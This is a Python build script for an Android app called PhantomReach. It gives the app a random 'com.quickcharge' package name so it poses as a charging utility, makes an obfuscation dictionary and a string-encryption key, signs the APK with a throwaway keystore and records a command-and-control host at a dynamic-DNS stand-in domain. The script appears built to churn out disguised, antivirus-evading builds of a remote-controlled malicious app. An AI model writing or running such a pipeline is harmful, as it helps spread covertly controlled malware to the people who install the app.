#!/usr/bin/env python3
import os
import random
import subprocess
import shutil
import json
from datetime import datetime

print("🔧 PHANTOMREACH BUILD & OBFUSCATION PIPELINE")
print("============================================")

# Step 1: Generate random package name
package_name = "com.quickcharge." + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
print(f"[1] Random package: {package_name}")

# Step 2: Update AndroidManifest.xml with new package
with open('AndroidManifest.xml', 'r') as f:
    manifest = f.read()
manifest = manifest.replace('com.phantom.reach', package_name)
with open('AndroidManifest.xml', 'w') as f:
    f.write(manifest)

# Step 3: Generate new obfuscation dictionary
with open('my_dict.txt', 'w') as f:
    chars = 'abcdefghijklmnopqrstuvwxyz'
    for i in range(1, 5):
        for c in chars:
            f.write(c * i + '\n')

# Step 4: Generate random AES key for string encryption
key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
print(f"[2] New encryption key: {key}")

# Step 5: Build APK
print("[3] Building APK...")
subprocess.run(['./gradlew', 'assembleRelease'], check=True)

# Step 6: Sign with new keystore
print("[4] Signing APK...")
subprocess.run([
    'jarsigner', '-verbose', '-sigalg', 'SHA1withRSA', '-digestalg', 'SHA1',
    '-keystore', 'fake.keystore', '-storepass', 'password',
    'app/build/outputs/apk/release/app-release-unsigned.apk', 'alias'
], check=True)

# Step 7: Zipalign
print("[5] Aligning APK...")
subprocess.run([
    'zipalign', '-v', '-p', '4',
    'app/build/outputs/apk/release/app-release-unsigned.apk',
    'PhantomReach_FINAL.apk'
], check=True)

# Step 8: Generate build info
build_info = {
    "version": "1.0",
    "package": package_name,
    "key": key,
    "built": datetime.now().isoformat(),
    "c2_host": "your-domain.ddns.net"
}
with open('build_info.json', 'w') as f:
    json.dump(build_info, f, indent=2)

print("[6] ✅ Build complete! Output: PhantomReach_FINAL.apk")
print("📦 Build info saved to build_info.json")

# Step 9: Hash the APK
import hashlib
with open('PhantomReach_FINAL.apk', 'rb') as f:
    hash_md5 = hashlib.md5(f.read()).hexdigest()
print(f"[7] MD5: {hash_md5}")